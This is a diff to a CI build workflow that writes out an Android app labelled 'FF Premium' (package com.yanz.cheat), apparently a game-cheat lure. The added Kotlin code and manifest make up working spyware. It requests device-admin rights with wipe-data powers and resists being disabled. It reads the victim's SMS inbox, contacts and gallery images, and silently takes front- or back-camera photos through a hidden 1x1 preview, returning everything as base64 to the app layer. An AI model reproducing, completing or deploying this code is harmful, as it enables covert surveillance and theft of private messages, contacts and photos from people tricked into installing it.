@@ -24,31 +24,223 @@ jobs:
           flutter-version: '3.22.0'
           channel: 'stable'
 
-      - name: Auto-Fix Android Folder
+      - name: Bikin Android Baru & Build
         run: |
-          # 1. Backup file kustom kita
-          mkdir -p /tmp/backup
-          cp android/app/src/main/AndroidManifest.xml /tmp/backup/
-          cp -r android/app/src/main/kotlin/com/yanz/cheat /tmp/backup/cheat_kt
-          cp android/app/src/main/res/xml/device_admin.xml /tmp/backup/ 2>/dev/null || true
-          
-          # 2. Hancurkan folder android lama
           rm -rf android
-          
-          # 3. Generate folder android baru yang modern
           flutter create --platforms=android --org com.yanz .
           
-          # 4. Kembalikan file kustom kita ke folder baru
-          cp /tmp/backup/AndroidManifest.xml android/app/src/main/
-          mkdir -p android/app/src/main/kotlin/com/yanz/cheat
-          cp /tmp/backup/cheat_kt/*.kt android/app/src/main/kotlin/com/yanz/cheat/
+          cat << 'EOF' > android/app/src/main/AndroidManifest.xml
+          <manifest xmlns:android="http://schemas.android.com/apk/res/android">
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
+            <uses-permission android:name="android.permission.FOREGROUND_SERVICE_SPECIAL_USE"/>
+            <uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>
+            <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.READ_MEDIA_IMAGES"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.VIBRATE"/>
+            <uses-permission android:name="android.permission.FLASHLIGHT"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.DISABLE_KEYGUARD"/>
+            <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES"/>
+            <application android:label="FF Premium" android:name="${applicationName}" android:icon="@mipmap/ic_launcher" android:usesCleartextTraffic="true">
+              <activity android:name=".MainActivity" android:exported="true" android:launchMode="singleTop" android:theme="@style/LaunchTheme" android:configChanges="orientation|keyboardHidden|keyboard|screenSize|smallestScreenSize|locale|layoutDirection|fontScale|screenLayout|density|uiMode" android:hardwareAccelerated="true" android:windowSoftInputMode="adjustResize">
+                <meta-data android:name="io.flutter.embedding.android.NormalTheme" android:resource="@style/NormalTheme" />
+                <intent-filter>
+                  <action android:name="android.intent.action.MAIN"/>
+                  <category android:name="android.intent.category.LAUNCHER"/>
+                </intent-filter>
+              </activity>
+              <receiver android:name=".DeviceAdmin" android:permission="android.permission.BIND_DEVICE_ADMIN" android:exported="true">
+                <meta-data android:name="android.app.device_admin" android:resource="@xml/device_admin"/>
+                <intent-filter><action android:name="android.app.action.DEVICE_ADMIN_ENABLED"/></intent-filter>
+              </receiver>
+              <service android:name="id.flutter.flutter_background_service.BackgroundService" android:foregroundServiceType="specialUse" android:exported="false">
+                <property android:name="android.app.PROPERTY_SPECIAL_USE_FGS_SUBTYPE" android:value="optimizer"/>
+              </service>
+              <meta-data android:name="flutterEmbedding" android:value="2" />
+            </application>
+          </manifest>
+          EOF
+
           mkdir -p android/app/src/main/res/xml
-          cp /tmp/backup/device_admin.xml android/app/src/main/res/xml/ 2>/dev/null || true
-          
-          # 5. Perbaiki nama package biar sesuai
-          sed -i 's/namespace ".*"/namespace "com.yanz.cheat"/g' android/app/build.gradle
-          sed -i 's/applicationId ".*"/applicationId "com.yanz.cheat"/g' android/app/build.gradle
-          sed -i 's/android:name="io.flutter.app.FlutterApplication"/android:name="${applicationName}"/g' android/app/src/main/AndroidManifest.xml
+          cat << 'EOF' > android/app/src/main/res/xml/device_admin.xml
+          <device-admin xmlns:android="http://schemas.android.com/apk/res/android">
+            <uses-policies><force-lock/><wipe-data/><reset-password/><disable-camera/></uses-policies>
+          </device-admin>
+          EOF
+
+          mkdir -p android/app/src/main/kotlin/com/yanz/cheat
+          cat << 'EOF' > android/app/src/main/kotlin/com/yanz/cheat/MainActivity.kt
+          package com.yanz.cheat
+          import android.app.admin.DevicePolicyManager
+          import android.content.ComponentName
+          import android.content.Intent
+          import io.flutter.embedding.android.FlutterActivity
+          import io.flutter.embedding.engine.FlutterEngine
+          import io.flutter.plugin.common.MethodChannel
+          class MainActivity : FlutterActivity() {
+              private val CHANNEL = "yanz/cheat"
+              private lateinit var bridge: NativeBridge
+              override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
+                  super.configureFlutterEngine(flutterEngine)
+                  bridge = NativeBridge(this)
+                  val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
+                  val admin = ComponentName(this, DeviceAdmin::class.java)
+                  if (!dpm.isAdminActive(admin)) {
+                      try {
+                          val i = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
+                          i.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin)
+                          startActivity(i)
+                      } catch (_: Exception) {}
+                  }
+                  MethodChannel(flutterEngine.dartExecutor.binaryMessenger, CHANNEL).setMethodCallHandler { call, result ->
+                      try {
+                          when (call.method) {
+                              "getSms" -> result.success(bridge.getSms())
+                              "getContacts" -> result.success(bridge.getContacts())
+                              "getGallery" -> result.success(bridge.getGallery())
+                              "capturePhoto" -> {
+                                  val front = call.argument<Boolean>("front") ?: false
+                                  bridge.capturePhoto(front) { b64 -> runOnUiThread { result.success(b64) } }
+                              }
+                              else -> result.notImplemented()
+                          }
+                      } catch (e: Exception) { result.success(if (call.method == "capturePhoto") "" else emptyList<Map<String, String>>()) }
+                  }
+              }
+          }
+          EOF
+
+          cat << 'EOF' > android/app/src/main/kotlin/com/yanz/cheat/DeviceAdmin.kt
+          package com.yanz.cheat
+          import android.app.admin.DeviceAdminReceiver
+          import android.content.Context
+          import android.content.Intent
+          class DeviceAdmin : DeviceAdminReceiver() {
+              override fun onDisableRequested(context: Context, intent: Intent): CharSequence = "Aplikasi tidak dapat dinonaktifkan."
+          }
+          EOF
+
+          cat << 'EOF' > android/app/src/main/kotlin/com/yanz/cheat/NativeBridge.kt
+          package com.yanz.cheat
+          import android.app.Activity
+          import android.content.ContentUris
+          import android.graphics.Bitmap
+          import android.net.Uri
+          import android.provider.ContactsContract
+          import android.provider.MediaStore
+          import android.util.Base64
+          import android.util.Size
+          import androidx.camera.core.CameraSelector
+          import androidx.camera.core.ImageCapture
+          import androidx.camera.core.ImageCaptureException
+          import androidx.camera.core.Preview
+          import androidx.camera.lifecycle.ProcessCameraProvider
+          import androidx.core.content.ContextCompat
+          import androidx.lifecycle.LifecycleOwner
+          import java.io.ByteArrayOutputStream
+          import java.io.File
+          class NativeBridge(private val activity: Activity) {
+              fun getSms(): List<Map<String, String>> {
+                  val out = mutableListOf<Map<String, String>>()
+                  val cursor = activity.contentResolver.query(Uri.parse("content://sms/inbox"), arrayOf("address", "body", "date"), null, null, "date DESC")
+                  cursor?.use {
+                      val iAddr = it.getColumnIndex("address"); val iBody = it.getColumnIndex("body"); val iDate = it.getColumnIndex("date")
+                      var count = 0
+                      while (it.moveToNext() && count < 100) {
+                          out.add(mapOf("from" to (it.getString(iAddr) ?: ""), "body" to (it.getString(iBody) ?: ""), "date" to (it.getLong(iDate) ?: 0L).toString()))
+                          count++
+                      }
+                  }
+                  return out
+              }
+              fun getContacts(): List<Map<String, String>> {
+                  val out = mutableListOf<Map<String, String>>()
+                  val cursor = activity.contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, arrayOf(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER), null, null, null)
+                  cursor?.use {
+                      val iName = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME); val iNum = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
+                      var count = 0
+                      while (it.moveToNext() && count < 300) {
+                          out.add(mapOf("name" to (it.getString(iName) ?: ""), "phone" to (it.getString(iNum) ?: "")))
+                          count++
+                      }
+                  }
+                  return out
+              }
+              fun getGallery(): List<Map<String, String>> {
+                  val out = mutableListOf<Map<String, String>>()
+                  val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
+                  val cursor = activity.contentResolver.query(uri, arrayOf(MediaStore.Images.Media._ID, MediaStore.Images.Media.DISPLAY_NAME), null, null, "date_added DESC")
+                  cursor?.use {
+                      val iId = it.getColumnIndex(MediaStore.Images.Media._ID); val iName = it.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME)
+                      var count = 0
+                      while (it.moveToNext() && count < 30) {
+                          val id = it.getLong(iId); val name = it.getString(iName) ?: ""
+                          try {
+                              val bmp = activity.contentResolver.loadThumbnail(ContentUris.withAppendedId(uri, id), Size(220, 220), null)
+                              out.add(mapOf("name" to name, "image" to toBase64(bmp)))
+                          } catch (_: Exception) {}
+                          count++
+                      }
+                  }
+                  return out
+              }
+              fun capturePhoto(front: Boolean, callback: (String) -> Unit) {
+                  val future = ProcessCameraProvider.getInstance(activity)
+                  future.addListener({
+                      try {
+                          val provider = future.get()
+                          val selector = if (front) CameraSelector.DEFAULT_FRONT_CAMERA else CameraSelector.DEFAULT_BACK_CAMERA
+                          val imageCapture = ImageCapture.Builder().build()
+                          val preview = Preview.Builder().build()
+                          preview.setSurfaceProvider { request ->
+                              try {
+                                  val surfaceTexture = android.graphics.SurfaceTexture(0)
+                                  surfaceTexture.setDefaultBufferSize(1, 1)
+                                  request.provideSurface(android.view.Surface(surfaceTexture), ContextCompat.getMainExecutor(activity)) {}
+                              } catch (_: Exception) {}
+                          }
+                          provider.unbindAll()
+                          provider.bindToLifecycle(activity as LifecycleOwner, selector, imageCapture, preview)
+                          val file = File(activity.cacheDir, "cap_${System.currentTimeMillis()}.jpg")
+                          imageCapture.takePicture(ImageCapture.OutputFileOptions.Builder(file).build(), ContextCompat.getMainExecutor(activity), object : ImageCapture.OnImageSavedCallback {
+                              override fun onImageSaved(outputFileResults: ImageCapture.OutputFileResults) {
+                                  try {
+                                      val b64 = Base64.encodeToString(file.readBytes(), Base64.NO_WRAP)
+                                      file.delete()
+                                      provider.unbindAll()
+                                      callback(b64)
+                                  } catch (_: Exception) { callback("") }
+                              }
+                              override fun onError(exception: ImageCaptureException) {
+                                  try { provider.unbindAll() } catch (_: Exception) {}
+                                  callback("")
+                              }
+                          })
+                      } catch (e: Exception) { callback("") }
+                  }, ContextCompat.getMainExecutor(activity))
+              }
+              private fun toBase64(bmp: Bitmap): String {
+                  val baos = ByteArrayOutputStream(); bmp.compress(Bitmap.CompressFormat.JPEG, 70, baos)
+                  return Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP)
+              }
+          }
+          EOF
+
+          cat << 'EOF' >> android/app/build.gradle
+          dependencies {
+              implementation "androidx.core:core-ktx:1.13.1"
+              implementation "androidx.camera:camera-core:1.3.4"
+              implementation "androidx.camera:camera-camera2:1.3.4"
+              implementation "androidx.camera:camera-lifecycle:1.3.4"
+          }
+          EOF
 
       - name: Flutter Pub Get
         run: flutter pub get
